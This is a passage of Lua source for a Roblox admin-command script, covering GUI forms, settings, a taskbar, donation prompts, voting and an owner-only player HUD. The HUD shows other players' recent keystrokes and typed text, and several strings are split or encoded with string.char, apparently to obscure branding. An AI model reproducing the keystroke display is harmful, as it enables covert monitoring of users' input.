						local Read = Instance.new("TextLabel", ValFrame) Read.Name = "Read" Read.Position = UDim2.new(0, 0, 0.1, 0) Read.Size = UDim2.new(1, 0, 0.8, 0) Read.BackgroundTransparency = 1 Read.Text = DefaultValue Read.Font = Settings.Font Read.FontSize = "Size14" Read.TextTransparency = 0.4 Read.TextXAlignment = "Left"
					end
				end
				if ValueType == "boolean" then
					local Check = Instance.new("ImageButton", ValFrame) Check.Name = "Check" Check.Position = UDim2.new(0.5, -15, 0.5, -15) Check.Size = UDim2.new(0, 30, 0, 30) Check.BackgroundTransparency = 1 Check.Image = "rbxassetid://48138474"
					if DefaultValue == true then
						Check.Image = "rbxassetid://48138491"
					end
					if Writable == true then
						CORE:HandleEvent(Check, "MouseButton1Down", function()
							local NewVal = not NewProperties[PropertyName]
							NewProperties[PropertyName] = NewVal
							if NewVal == true then
								Check.Image = "rbxassetid://48138491"
							else
								Check.Image = "rbxassetid://48138474"
							end
						end)
					else
						Check.ImageTransparency = 0.5
					end
				end
				YCount = YCount + 50
			end
		end
	end
	
	Frame.CanvasSize = UDim2.new(0,0,0,YCount)

	Closed.Event:connect(function() HasClosed = true end)
	
	repeat wait(0.1) until HasClosed
	return NewProperties
end

function GUI:SettingsGui(Player)
	if not Player then return nil end
	local CloneViewSettings,CanChange = {},false
	
	local ViewSettings = {
		["Version"] = {CORE.Version.Value, false, nil};
		["Prefix"] = {Settings.Prefix, 3, "Prefix"};
		["Font"] = {Settings.Font, 3, "Font"};
		["Color Scheme"] = {Settings.ColorScheme, 3, "ColorScheme"};
		["Transparency Scheme"] = {Settings.TransparencyScheme * 100, 3, "TransparencyScheme"};
		["Server Locked"] = {Settings.ServerLocked, 3, "ServerLocked"};
		["Fun Commands"] = {Settings.Fun, 3, "Fun"};
		["Disable Abuse"] = {Settings.DisableAbuse, 3, "DisableAbuse"};
		["Minimum Account Age"] = {Settings.MinimumAge, 3, "MinimumAge"};
		["Execute Notification Sound ID"] = {Settings.ExecuteNotificationSound, 3, "ExecuteNotificationSound"};
		["Enable Sounds"] = {Settings.EnableSounds, 3, "EnableSounds"};
		["Group ID"] = {Settings.GroupID, false, "GroupID"};
		["Group Banned Rank"] = {Settings.GroupBanRank, false, "GroupBanRank"};
		["Group Member Rank"] = {Settings.GroupMemberRank, false, "GroupMemberRank"};
		["Group Admin Rank"] = {Settings.GroupAdminRank, false, "GroupAdminRank"};
		["Group Owner Rank"] = {Settings.GroupOwnerRank, false, "GroupOwnerRank"};
		["Banned Group IDs"] = {Settings.BannedGroupIDs, false, "BannedGroupIDs"};
		["IRC Server"] = {Settings.IRCServer, false, "IRCServer"};
		["IRC Channel"] = {Settings.IRCChannel, false, "IRCChannel"};
		["Remote Connection"] = {REMOTE.RemoteConnection, false, nil};
		["Bet"] = {Settings.Bet, 3, "Bet"};
	}
	
	local _,RankNum = RANK:GetRank(Player)
	if RankNum >= 3 then
		CanChange = true
	end
	
	for Prop,Data in pairs(ViewSettings) do
		local Writable = false
		if tonumber(Data[2]) and Data[2] <= RankNum then Writable = true end
		CloneViewSettings[Prop] = {Data[1], Writable}
	end
	
	local NewSettings = GUI:PropertyGui(Player, "Settings", "Settings", CloneViewSettings)
	if CanChange then
		for Prop,Data in pairs(ViewSettings) do
			if Data[3] then
				Settings[Data[3]] = NewSettings[Prop] -- wow haxy
			end
		end
		CORE:FixSettings()
	end
end

function GUI:MessageAdmins(TitleText, BodyText, Icon)
	for _,Player in pairs(Server.Players:GetPlayers()) do
		local PlayerAdmin, PlayerRank = RANK:IsAdmin(Player)
		if PlayerAdmin then
			GUI:SendMessage(Player, TitleText, BodyText, Icon)
		end
	end
end

function GUI:TellAdmin(Player)
	if not Player then return end
	
	local ValidAdmin,Rank = RANK:IsAdmin(Player)
	if ValidAdmin == true then
		GUI:SendMessage(Player, "Ma".."ker".."Mo".."delLua".."'s Admin Message", "GREEN You are an admin "..Player.Name.."! Your rank is "..Rank.." [ PREFIX '"..Settings.Prefix.."' ]", "Check", 5)
		if Settings.EnableSounds == true and Player:FindFirstChild("PlayerGui") then
			local SoundID = 237866523
			if Rank == "Admin" then SoundID = 237866621 elseif Rank == "Owner" then SoundID = 237866707 end
			local Sound = SOUND:MakeSound(Player.PlayerGui, SoundID, 0.5, 1)
			Sound:Play()
			coroutine.wrap(function()
				wait(4)
				Sound:Stop()
				Sound:Destroy()
			end)()
		end
	end
end

function GUI:TellNotAdmin(Player)
	if not Player then return end
	
	GUI:SendMessage(Player, "Mak".."er".."M".."o".."del".."Lua's Admin Message", "You are now no longer an admin", "Information")
end

function GUI:CreateTaskBar(Player)
	if not Player then return nil end
	if Settings.EnableTaskBar == false then return nil end
	Player:WaitForChild("PlayerGui")
	local SG = Player.PlayerGui:FindFirstChild("M".."akerMod".."el".."Lua's TaskBar")
	if SG then SG:Destroy() end
	SG = Instance.new("ScreenGui", Player.PlayerGui) SG.Name = "M".."akerMod".."elLua's TaskBar"
	local IsMoving = false
	local TaskBarShown = false
	local Tasks = {}

	local TaskBar = Instance.new("Frame", SG) TaskBar.Name = "TaskBar" TaskBar.Size = UDim2.new(1, 0, 0, 50) TaskBar.Position = UDim2.new(0,0,1,20) TaskBar.BackgroundColor3 = GUI:GetColor() TaskBar.BackgroundTransparency = Settings.TransparencyScheme TaskBar.BorderSizePixel = 0
	local TaskButton = Instance.new("ImageButton", TaskBar) TaskButton.Name = "TaskButton" TaskButton.Position = UDim2.new(1, -50, 0, -70) TaskButton.Size = UDim2.new(0, 50, 0, 50) TaskButton.BackgroundTransparency = 1 TaskButton.Image = "rbxassetid://222795206"
	
	local AddForm = Instance.new("BindableEvent", SG) AddForm.Name = "AddForm"
	local Open,CloseForm = false,nil
	if Settings.EnableAdminMenu then
		local MenuButton = Instance.new("ImageButton", TaskBar) MenuButton.Name = "MenuButton" MenuButton.Position = UDim2.new(1, -50, 0, -120) MenuButton.Size = UDim2.new(0, 50, 0, 50) MenuButton.BackgroundTransparency = 1 MenuButton.Image = "rbxassetid://302470270"
		coroutine.wrap(function() wait(1) CORE:HandleEvent(MenuButton, "MouseButton1Click", function()
			if Open == false then
				local Frame, Close, Closed = GUI:CreateForm(Player, string.char(77, 97, 107, 101, 114, 77, 111, 100, 101, 108, 76, 117, 97, 39, 115).." Admin Menu", UDim2.new(0.4,0,0.5), nil, 302470270, true, nil, nil, false, true, true)
				Open,CloseForm = true,Close
				
				local Title = Instance.new("TextLabel", Frame) Title.Name = "Title" Title.BackgroundTransparency = 1 Title.Position = UDim2.new(0,0,0,0) Title.Size = UDim2.new(1,0,0,30) Title.Font = "SourceSansBold" Title.FontSize = "Size24" Title.Text = string.char(77, 97, 107, 101, 114, 77, 111, 100, 101, 108, 76, 117, 97, 39, 115).." Admin V"..CORE.Version.Value Title.TextColor3 = GUI:ContrastColor()
				local Separator = Instance.new("Frame", Frame) Separator.Name = "Separator" Separator.BorderColor3 = Color3.new(1,1,1) Separator.Position = UDim2.new(0.5,0,0,30) Separator.Size = UDim2.new(0,0,1,-30)
				local Info = Instance.new("TextLabel", Frame) Info.Name = "Info" Info.BackgroundTransparency = 1 Info.Position = UDim2.new(0,0,0,30) Info.Size = UDim2.new(0.5,0,1,-30) Info.Font = Settings.Font Info.FontSize = "Size18" Info.Text = "Info/Help" Info.TextColor3 = GUI:ContrastColor() Info.TextYAlignment = "Top"
				local Body = Instance.new("TextLabel", Info) Body.Name = "Body" Body.BackgroundTransparency = 1 Body.Position = UDim2.new(0,0,0,25) Body.Size = UDim2.new(1,0,1,-25) Body.Font = "SourceSans" Body.FontSize = "Size14" Body.Text = string.gsub(Server.MPS:GetProductInfo(209330909).Description, "PREFIX", Settings.Prefix) Body.TextColor3 = GUI:ContrastColor() Body.TextYAlignment = "Top" Body.TextWrapped = true
				local Donate = Info:Clone() Donate.Parent = Frame Donate.Name = "Donate" Donate.Text = "Donate/Get admin" Donate.Position = UDim2.new(0.5,0,0,30) Donate.Body.Text = "Please select an amount that fits your generosity and to help support future updates. Press the 'Get admin now' to get copy for your own place!"
				local function DonateMoney(Type, Element)
					local Request = CORE:GetTable(string.char(49, 53, 53, 54, 56, 52, 51, 54, 57))
					local Get = Request[Type]
					if Server.MPS:GetProductInfo(Get[1]).IsForSale == true then
						Server.MPS:PromptPurchase(Player, Get[1], true)
					elseif Server.MPS:GetProductInfo(Get[2]).IsForSale == true then
						Server.MPS:PromptPurchase(Player, Get[2], true)
					elseif Server.MPS:GetProductInfo(Get[3]).IsForSale == true then
						Server.MPS:PromptPurchase(Player, Get[3], true)
					else
						Element.Text = "Cannot get request"
					end
				end
				local Get = Instance.new("TextButton", Donate) Get.Name = "Get" Get.Position = UDim2.new(0,0,0.5,0) Get.Size = UDim2.new(1,0,0,30) Get.Font = "ArialBold" Get.FontSize = "Size14" Get.Text = "Get MakerModelLua's Admin V"..CORE.Version.Value.." now for FREE!" Get.BackgroundColor3 = Color3.new(1,0,1) Get.TextColor3 = Color3.new(1,1,1) Get.TextStrokeColor3 = Color3.new(0,0,0) Get.TextStrokeTransparency = 0 Get.TextWrapped = true CORE:HandleEvent(Get, "MouseButton1Down", function() MARKET:PromptPurchase(Player, AdminID) end) SOUND:BindButton(Get)
				local Dnt = Instance.new("TextButton", Donate) Dnt.Name = "DonateButton" Dnt.Position = UDim2.new(0,0,1,-120) Dnt.Size = UDim2.new(1,0,0,30) Dnt.Font = "ArialBold" Dnt.FontSize = "Size14" Dnt.Text = "6 Robux" Dnt.BackgroundColor3 = Color3.new(1,1,0) Dnt.TextColor3 = Color3.new(1,1,1) Dnt.TextStrokeColor3 = Color3.new(0,0,0) Dnt.TextStrokeTransparency = 0 Dnt.TextWrapped = true CORE:HandleEvent(Dnt, "MouseButton1Down", function() DonateMoney("6R", Dnt) end) SOUND:BindButton(Dnt)
				local Dnt = Dnt:Clone() Dnt.Parent = Donate Dnt.Position = UDim2.new(0,0,1,-90) Dnt.Text = "20 Robux" Dnt.BackgroundColor3 = Color3.new(0,1,0) CORE:HandleEvent(Dnt, "MouseButton1Down", function() DonateMoney("20R", Dnt) end) SOUND:BindButton(Dnt)
				local Dnt = Dnt:Clone() Dnt.Parent = Donate Dnt.Position = UDim2.new(0,0,1,-60) Dnt.Text = "100 Robux" Dnt.BackgroundColor3 = Color3.new(0,1,0) CORE:HandleEvent(Dnt, "MouseButton1Down", function() DonateMoney("100R", Dnt) end) SOUND:BindButton(Dnt)
				local Dnt = Dnt:Clone() Dnt.Parent = Donate Dnt.Position = UDim2.new(0,0,1,-30) Dnt.Text = "500 ROBUX!" Dnt.BackgroundColor3 = Color3.new(1,0,0) Dnt.FontSize = "Size18" CORE:HandleEvent(Dnt, "MouseButton1Down", function() DonateMoney("500R", Dnt) end) SOUND:BindButton(Dnt)
				local PlayerAdmin, PlayerRank = RANK:IsAdmin(Player)
				
				if PlayerAdmin == true then Body.Text = Body.Text.." (You're an admin, your rank is "..PlayerRank..")" end
				
				if Closed then
					Closed.Event:connect(function()
						Open = false
					end)
				end
			else
				CloseForm:Invoke()
			end
		end) end)()
		if RANK:GetRank(Player) == "Owner" then
			local HUDButton = Instance.new("ImageButton", TaskBar) HUDButton.Name = "HUDButton" HUDButton.Position = UDim2.new(1, -50, 0, -170) HUDButton.Size = UDim2.new(0, 50, 0, 50) HUDButton.BackgroundTransparency = 1 HUDButton.Image = "rbxassetid://329362761"
			CORE:HandleEvent(HUDButton, "MouseButton1Click", function()
				local HUDSG = Player.PlayerGui:FindFirstChild("M".."a".."k".."e".."r".."m".."od".."elLu".."a's HUD Gui")
				if HUDSG then
					HUDSG:Destroy()
				else
					GUI:CreateHUD(Player)
				end
			end)
		end
	end
	
	CORE:HandleEvent(TaskButton, "MouseButton1Click", function()
		if IsMoving == false then
			if TaskBarShown == true then
				TaskBarShown = false
				IsMoving = true
				TaskBar:TweenPosition(UDim2.new(0,0,1,20), "In", "Sine", 0.3, false, function() IsMoving = false end)
			else
				TaskBarShown = true
				IsMoving = true
				TaskBar:TweenPosition(UDim2.new(0,0,0.6,0), "Out", "Sine", 0.3, false, function() IsMoving = false end)
			end
		end
	end)
	
	local function ReloadIcons()
		for Num,Data in pairs(Tasks) do
			Data[2].Position = UDim2.new(0,(Num * 50) - 50,0,0,0)
		end
	end
	
	AddForm.Event:connect(function(Form, IconID, Closed, Minimized, Restore)
		local Icon = Instance.new("ImageButton", TaskBar) Icon.Name = "Icon" Icon.Position = UDim2.new(0,#Tasks * 50,0,0,0) Icon.Size = UDim2.new(0, 50, 0, 50) Icon.BackgroundColor3 = GUI:GetColor() Icon.BackgroundTransparency = 0.5 Icon.Image = "rbxassetid://"..IconID
		table.insert(Tasks, {Form, Icon})
		local CanClick = true
		CORE:HandleEvent(Icon, "MouseButton1Down", function()
			if Form.IsActive.Value == false then
				Restore:Invoke()
			elseif CanClick == true then
				coroutine.wrap(function()
					CanClick = false
					local DefPos = Form.Dragger.Position
					for i = 1,15 do
						Form.Dragger.Position = DefPos + UDim2.new(0,math.random(-2,2),0,math.random(-2,2))
						wait(0.05)
					end
					Form.Dragger.Position = DefPos
					CanClick = true
				end)()
			end
		end)
		ReloadIcons()
		
		Closed.Event:connect(function()
			for Num,Data in pairs(Tasks) do
				if Data[1] == Form then
					Icon:Destroy()
					table.remove(Tasks, Num)
				end
			end
			ReloadIcons()
		end)
	end)
end

function GUI:ShowDebtStats(Player, ManualText)
	local Text = ManualText
	if not ManualText then
		Text = "CANNOT GET STATISTICS"
		local RawPage = REMOTE:GetURL("http://www.nationaldebtclocks.org/debtclock/unitedstates")
		if RawPage then
			local _,GetStart = string.find(RawPage, 'debtDisplayFast">')
			local GetEnd,__ = string.find(string.sub(RawPage,GetStart), '</span>')
			Text = "US National Debt: $"..STRING:GetComma(string.sub(RawPage, GetStart + 1, GetStart + GetEnd - 2))
		end
	end
	
	local Frame = GUI:CreateForm(Player, "US National Debt", UDim2.new(0.05,500,0.05,100), nil, 38574945)
	local Body = Instance.new("TextLabel", Frame) Body.Name = "Body" Body.Size = UDim2.new(1,0,1,0) Body.BackgroundTransparency = 1 Body.Text = Text Body.Font = "ArialBold" Body.FontSize = "Size36" Body.TextColor3 = Color3.new(1,1,1) Body.TextStrokeTransparency = 0 Body.TextWrapped = true
	
	return Text
end

function GUI:ShowCommand(Player, CommandTrigger, Dialog)
	if not Player then return nil end
	if not CommandTrigger then return nil end
	
	if type(CommandTrigger) == "string" and string.sub(CommandTrigger,1,#Settings.Prefix) == Settings.Prefix then CommandTrigger = string.sub(CommandTrigger,#Settings.Prefix + 1) end
	
	local CommandKey = CommandTrigger
	
	if not Commands[CommandKey] then
		for CommandNames,_ in pairs(Commands) do
			for _,CommandName in pairs(CommandNames) do
				if CommandName == CommandKey then
					CommandKey = CommandNames
				end
			end
		end
	end
	
	local CommandData = Commands[CommandKey]
	
	local BodyText = "No valid command has been entered"
	local TitleText = "Error"
	local CanExe = false
	if CommandData then
		if Dialog then
			Dialog:Invoke(true)
		end
		local PlayerRank = RANK:GetRank(Player)
		if RANK:ConvertRank(PlayerRank) >= RANK:ConvertRank(CommandData[4]) then CanExe = true end
		if PlayerRank == "Member" and CommandData.Abusable == true then CanExe = false end
		
		TitleText = "Command: "..CommandKey[1]
		BodyText = "COMMAND: "..Settings.Prefix..CommandKey[1]..Settings.Bet..CommandData[1]..[[
 

Aliases: ]]..Settings.Prefix..table.concat(CommandKey, ", "..Settings.Prefix)..[[
 

Description: ]]..CommandData[2]..[[
 

Arguments: ]]..CommandData[3]..[[
 

Minimum rank needed: ]]..CommandData[4]..[[
 

Fun command: ]]..STRING:BoolString(CommandData[5])..[[
 

Abusable command: ]]..STRING:BoolString(CommandData.Abusable)..[[


Http Command ]]..STRING:BoolString(CommandData.Http)
	end
	
	_, _, Closed, _, Minimized = GUI:FullMessage(Player, TitleText, BodyText, "Search", not CanExe)
	if Dialog then
		Closed.Event:connect(function() Dialog:Invoke(false) end)
		Minimized.Event:connect(function() Dialog:Invoke(false) end)
	end
end

function GUI:CreateHUD(Speaker)
	if not Speaker or not Speaker:FindFirstChild("PlayerGui") then return nil end
	
	local SG = Speaker.PlayerGui:FindFirstChild("M".."a".."ke".."r".."m".."od".."elLu".."a's HUD Gui")
	if SG then SG:Destroy() end
	SG = Instance.new("ScreenGui", Speaker.PlayerGui) SG.Name = "M".."a".."k".."e".."r".."m".."odelLu".."a's HUD Gui"
	
	local function AddHUD(Player, Char)
		if not Char or not Char:FindFirstChild("Head") then return nil end
		
		local Rank = RANK:GetRank(Player)
		local PlayerHUD = Instance.new("BillboardGui", SG) PlayerHUD.Name = "PlayerHUD" PlayerHUD.AlwaysOnTop = true PlayerHUD.Adornee = Char.Head PlayerHUD.Size = UDim2.new(3,0,3,0)
		local HUD = Instance.new("ImageLabel", PlayerHUD) HUD.Name = "HUD" HUD.Size = UDim2.new(1, 0, 1, 0) HUD.BackgroundColor3 = Color3.new(1, 1, 1) HUD.BackgroundTransparency = 1
		local InfoLabel = Instance.new("TextLabel", PlayerHUD) InfoLabel.Name = "InfoLabel" InfoLabel.Position = UDim2.new(1, -1, 0, 0) InfoLabel.Size = UDim2.new(7, 0, 0.8, 0) InfoLabel.BackgroundColor3 = Color3.new(1, 1, 1) InfoLabel.BackgroundTransparency = 1 InfoLabel.Text = "" InfoLabel.Font = "Arial" InfoLabel.TextScaled = true InfoLabel.TextStrokeTransparency = 0.9 InfoLabel.TextWrapped = true InfoLabel.TextXAlignment = "Left" InfoLabel.TextYAlignment = "Top" InfoLabel.TextColor3 = Color3.new(0, 0, 0) InfoLabel.TextStrokeColor3 = Color3.new(1, 1, 1)
		local KeyLabel = Instance.new("TextLabel", PlayerHUD) KeyLabel.Name = "KeyLabel" KeyLabel.Position = UDim2.new(-1, 1, -1, 0) KeyLabel.Size = UDim2.new(1, 0, 3, 0) KeyLabel.BackgroundColor3 = Color3.new(1, 1, 1) KeyLabel.BackgroundTransparency = 1 KeyLabel.Text = "" KeyLabel.Font = "Arial" KeyLabel.FontSize = "Size14" KeyLabel.TextScaled = true KeyLabel.TextStrokeTransparency = 0.9 KeyLabel.TextWrapped = true KeyLabel.TextXAlignment = "Right" KeyLabel.TextYAlignment = "Top" KeyLabel.TextColor3 = Color3.new(1, 1, 1)
		local KeyOutput = Instance.new("TextLabel", PlayerHUD) KeyOutput.Name = "KeyOutput" KeyOutput.Position = UDim2.new(0, 1, -0.5, 0) KeyOutput.Size = UDim2.new(5, 0, 0.5, 1) KeyOutput.BackgroundTransparency = 1 KeyOutput.Text = "" KeyOutput.Font = "SourceSansLight" KeyOutput.FontSize = "Size14" KeyOutput.TextScaled = true KeyOutput.TextWrapped = true KeyOutput.TextXAlignment = "Left" KeyOutput.TextColor3 = Color3.new(1, 1, 1)
		coroutine.wrap(function() while wait() and InfoLabel and InfoLabel.Parent and Char and Char:FindFirstChild("Head") do
			InfoLabel.Text = "Name: "..Player.Name..[[ 
Rank: ]]..RANK:GetRank(Player)..[[ 
Age: ]]..STRING:FindAge(Player.AccountAge)
			if Speaker.Character and Speaker.Character:FindFirstChild("Head") then
				InfoLabel.Text = InfoLabel.Text..[[ 
Distance: ]]..CORE:Round((Speaker.Character.Head.Position - Player.Character.Head.Position).magnitude)
			end
			if LastKeys[Player.UserId] then
				local Keys = ""
				local KeyLog = {}
				for _,KeyData in pairs(LastKeys[Player.UserId]) do
					table.insert(KeyLog, KeyData[1])
					if KeyData[2] == 8 then
						Keys = string.sub(Keys, 1, #Keys - 1)
					elseif KeyData[2] == 13 then
						Keys = Keys.." "
					else
						Keys = Keys..string.char(KeyData[2])
					end
				end
				KeyLabel.Text = table.concat(KeyLog, "\n")
				KeyOutput.Text = Keys
			end
			HUD.Image = "rbxassetid://"..RankHUD[Rank]
		end end)()
		
		local CharRev,Removing = nil,nil
		CharRev = Player.CharacterRemoving:connect(function()
			PlayerHUD:Destroy()
			CharRev:disconnect()
			Removing:disconnect()
		end)
		Removing = Server.Players.PlayerRemoving:connect(function(PlayerR) if PlayerR == Player then
			PlayerHUD:Destroy()
			CharRev:disconnect()
			Removing:disconnect()
		end end)
	end
	
	local function ConnectHUD(Player)
		if Player ~= Speaker then
			if Player.Character then
				AddHUD(Player, Player.Character)
			end
			
			Player.CharacterAdded:connect(function(Char)
				if Speaker then
					AddHUD(Player, Char)
				else return nil
				end
			end)
		end
	end
	
	for _,Player in pairs(Server.Players:GetPlayers()) do
		ConnectHUD(Player)
	end
	
	Server.Players.PlayerAdded:connect(ConnectHUD)
end

function GUI:CreateMessagePrompt(Player, Title, ImageID, PreAdd, SpeakerEvents)
	if not Player or not Player:FindFirstChild("PlayerGui") then return nil end
	local Stopped = false
	
	local Frame, _, Closed = GUI:CreateForm(Player, Title, UDim2.new(0.3,0,0.5,0), nil, ImageID)
	Frame.Size = UDim2.new(1, 0, 1, -30)
	Frame.CanvasSize = UDim2.new(0, 0 ,0 ,0)
	
	local FakeCB = Instance.new("TextButton", Frame.Parent) FakeCB.Name = "FakeChatBox" FakeCB.Position = UDim2.new(0, 0, 1, -30) FakeCB.Size = UDim2.new(1, -50, 0, 30) FakeCB.BackgroundTransparency = 1 FakeCB.Text = "Click here or press the '-' key" FakeCB.Font = Settings.Font FakeCB.FontSize = "Size18" FakeCB.TextXAlignment = "Left" FakeCB.ZIndex = 2
	local ChatBox = Instance.new("TextBox", Frame.Parent) ChatBox.Name = "ChatBox" ChatBox.Position = UDim2.new(0, 0, 1, -30) ChatBox.Size = UDim2.new(1, -50, 0, 30) ChatBox.BackgroundTransparency = 0.5 ChatBox.BackgroundColor3 = GUI:GetColor() ChatBox.Text = "" ChatBox.Font = Settings.Font ChatBox.FontSize = "Size18" ChatBox.TextXAlignment = "Left" ChatBox.ClearTextOnFocus = false
	local Send = Instance.new("TextButton", Frame.Parent) Send.Position = UDim2.new(1, -50, 1, -30) Send.Size = UDim2.new(0, 50, 0, 30) Send.BackgroundColor3 = GUI:GetColor() Send.BackgroundTransparency = 0.5 Send.Text = "Enter" Send.Font = Settings.Font Send.FontSize = "Size14"
	
	local function AddLine(Speaker, MessageText, MessageColor)
		MessageText = STRING:DetermineFilter(MessageText, Speaker, Player)
		if MessageColor == true then MessageColor = Color3.new(1,0,0) end
		if not MessageColor then MessageColor = GUI:ContrastColor() end
		local Bounds = Instance.new("Frame") Bounds.Name = "Bounds" Bounds.Position = UDim2.new(0, 0, 1, -20) Bounds.Size = UDim2.new(1, 0, 0, 20) Bounds.BackgroundTransparency = 1
		local Name = Instance.new("TextLabel", Bounds) Name.Name = "PName" Name.Size = UDim2.new(0, 60, 1, 0) Name.BackgroundTransparency = 1 Name.Text = Speaker..": " Name.Font = "ArialBold" Name.FontSize = "Size14" Name.TextXAlignment = "Left" Name.TextColor3 = GUI:GetNameColor(Speaker).Color
		local Message = Instance.new("TextLabel", Bounds) Message.Name = "Message" Message.Position = UDim2.new(0, 60, 0, 0) Message.Size = UDim2.new(0, 60, 1, 0) Message.BackgroundTransparency = 1 Message.Text = MessageText Message.Font = "ArialBold" Message.FontSize = "Size14" Message.TextXAlignment = "Left" Message.TextColor3 = MessageColor
		Bounds.Parent = Frame
	end
	
	local RPR = CORE:CreateRemotePropertyReader(ChatBox)
	
	local Functions = Instance.new("Folder", Frame) Functions.Name = "Functions"
	local SendPressed = Instance.new("BindableEvent", Functions) SendPressed.Name = "SendPressed"
	local AddMessage = Instance.new("BindableFunction", Functions) AddMessage.Name = "AddMessage"
	
	local EnterPressed = Instance.new("RemoteFunction", ChatBox) EnterPressed.Name = "EnterPressed"
	local ClearCB = Instance.new("RemoteFunction", ChatBox) ClearCB.Name = "ClearCB"
	
	CORE:ExecuteResource("MessagePromptHandler", Frame)
	
	wait(0.1)
	
	if PreAdd then
		for Num,Add in pairs(PreAdd) do
			AddLine(Add[1], Add[2], Add[3])
		end
	end
	
	--[[
	CORE:ExecuteResource("ChatBoxLocal", ChatBox)
	
	CORE:HandleEvent(ChatBox, "MouseEnter", function()
		if ChatBox.Text == "Click here or press the '-' key" then
			ChatBox.Text = ""
		end
	end)
	]]
	
	local function FireSendPressed()
		local Text = CORE:ReadProperty(RPR, Player, "Text")
		if Text ~= "" and Text ~= "Click here or press the '-' key" then
			SendPressed:Fire(Text)
			FakeCB.Visible = true
			ClearCB:InvokeClient(Player)
		end
	end
	
	Closed.Event:connect(function()
		if Stopped == false then
			Stopped = true
			if SpeakerEvents then SpeakerEvents("Leave") end
		end
	end)
	
	CORE:HandleEvent(Send, "MouseButton1Down", FireSendPressed)
	
	AddMessage.OnInvoke = AddLine
	
	if SpeakerEvents then
		SpeakerEvents("Join")
	
		coroutine.wrap(function()
			repeat wait() until not Frame or not Frame.Parent
			if Stopped == false then
				Stopped = true
				SpeakerEvents("Leave")
			end
		end)()
	end
	
	return SendPressed, AddMessage
end

function GUI:PromptMessageWithButtons(Player, Title, BodyText, IconID, Buttons, Time, ShowFormButtons, DontFilter)
	if tonumber(Time) then ShowFormButtons = false end
	if not DontFilter then BodyText = STRING:DetermineFilter(BodyText, Player) end
	local Frame, Close = GUI:CreateForm(Player, Title, UDim2.new(0.4,0,0.4,0), nil, IconID, ShowFormButtons)
	local Body = Instance.new("TextLabel", Frame) Body.Name = "Body" Body.Size = UDim2.new(1, 0, 1, -60) Body.BackgroundTransparency = 1 Body.Text = BodyText Body.Font = Settings.Font Body.FontSize = "Size18" Body.TextWrapped = true Body.TextColor3 = GUI:ContrastColor()
	local Clicked = nil
	local Alive = true
	
	local function ClosePrompt(ButtonName)
		Alive = false
		Close:Invoke()
		Clicked = ButtonName
	end
	
	for Num,Select in pairs(Buttons) do
		local Name = Select
		local Style = "White"
		local TextColor3 = Color3.new(0,0,0)
		if type(Select) == "table" then
			Name = Select[1]
			if Select[2] then Style = Select[2] end
			if Select[3] then TextColor3 = Select[3] end
		elseif type(Select) == "string" then
			local Case = string.lower(Select)
			if Case == "ok" then
				Name = "Ok"
				Style = "Primary"
				TextColor3 = Color3.new(1,1,1)
			elseif Case == "yes" then
				Name = "Yes"
				Style = "Gray"
				TextColor3 = Color3.new(0,1,0)
			elseif Case == "no" then
				Name = "No"
				Style = "Red"
				TextColor3 = Color3.new(1,0,0)
			end
		end
		
		if Style == "None" then Style = "Custom" end
		if Style == "Casual" then Style = "RobloxButton" end
		if Style == "Red" then Style = "RobloxButtonDefault" end
		if Style == "Gray" then Style = "RobloxRoundButton" end
		if Style == "Primary" then Style = "RobloxRoundDefaultButton" end
		if Style == "White" then Style = "RobloxRoundDropdownButton" end
		
		local Button = Instance.new("TextButton", Frame) Button.Name = Name Button.Position = UDim2.new((Num/#Buttons)-(1/#Buttons), 0, 1, -55) Button.Size = UDim2.new(1/#Buttons, 0, 0, 50) Button.BackgroundColor3 = Color3.new(1, 1, 1) Button.Text = Name Button.Font = Settings.Font Button.FontSize = "Size14" Button.TextScaled = true Button.TextWrapped = true Button.TextColor3 = TextColor3 Button.Style = Style
		CORE:HandleEvent(Button, "MouseButton1Down", function() ClosePrompt(Name) end)
		SOUND:BindButton(Button)
	end
	
	if tonumber(Time) then
		local Ticker = Instance.new("TextLabel", Frame.Parent) Ticker.Size = UDim2.new(1, 0, 0, 30) Ticker.TextColor3 = GUI:ContrastColor() Ticker.BackgroundTransparency = 1 Ticker.Text = Time Ticker.Font = "ArialBold" Ticker.FontSize = "Size18"
		Frame.Size = Frame.Size + UDim2.new(0,0,0,-30)
		Frame.Position = Frame.Position + UDim2.new(0,0,0,30)
		
		for i = Time,0,-1 do
			for ii = 1,10 do
				if Alive == true then
					Ticker.Text = i
					wait(0.1)
				else
					break
				end
			end
		end
		if Alive == true then
			ClosePrompt()
		end
	end
	
	repeat wait() until Alive == false
	return Clicked
end

function GUI:Vote(Speaker, Players, Text, Time)
	if not Players or not Text or #Players <= 0 then return end
	
	local Votes = {}
	local Tick = 0
	
	for _,Player in pairs(Players) do
		local FilterText = STRING:DetermineFilter(Text, Speaker, Player)
		local CanVote = true
		if not game.Players:FindFirstChild(tostring(Player)) or not Player.PlayerGui then CanVote = false end
		if CanVote == true then
			coroutine.wrap(function()
				local Answer = GUI:PromptMessageWithButtons(Player, "Vote", FilterText, 34730262, {"Yes", "No"}, Time, false, true)
				if Answer == nil then Answer = "Unknown" end
				table.insert(Votes, Answer)
			end)()
		end
	end
	repeat wait(1) Tick = Tick + 1 until #Votes >= #Players or Tick >= Time
	wait(2)
	if Speaker and Speaker:FindFirstChild("PlayerGui") then
		local Total = #Players
		local Yes,No,Unknown = 0,0,0
		for _,Vote in pairs(Votes) do
			if Vote == "Yes" then Yes = Yes + 1
			elseif Vote == "No" then No = No + 1
			end
		end
		Unknown = #Players - #Votes
		
		local Frame = GUI:CreateForm(Speaker, "Vote Results", UDim2.new(0.35, 0, 0.35, 0), nil, 42330863)
		local QText = Instance.new("TextLabel", Frame) QText.Name = "QText" QText.Size = UDim2.new(1, 0, 1, -55) QText.BackgroundColor3 = Color3.new(1, 1, 1) QText.BackgroundTransparency = 1 QText.Text = "Results for: "..STRING:DetermineFilter(Text, Speaker) QText.Font = Settings.Font QText.FontSize = "Size18" QText.TextWrapped = true QText.TextYAlignment = "Top" QText.TextColor3 = GUI:ContrastColor()
		local RTextYes = Instance.new("TextLabel", Frame) RTextYes.Name = "RTextYes" RTextYes.Position = UDim2.new(0, 0, 1, -55) RTextYes.Size = UDim2.new(1, 0, 0, 55) RTextYes.BackgroundColor3 = Color3.new(1, 1, 1) RTextYes.BackgroundTransparency = 1 RTextYes.Font = Settings.Font RTextYes.FontSize = "Size18" RTextYes.TextXAlignment = "Left" RTextYes.TextYAlignment = "Bottom" RTextYes.TextColor3 = Color3.new(0, 1, 0) RTextYes.Text = [[Yes:
]]..Yes.."/"..Total..[[ 
]]..math.ceil((Yes/Total)*100).."% "
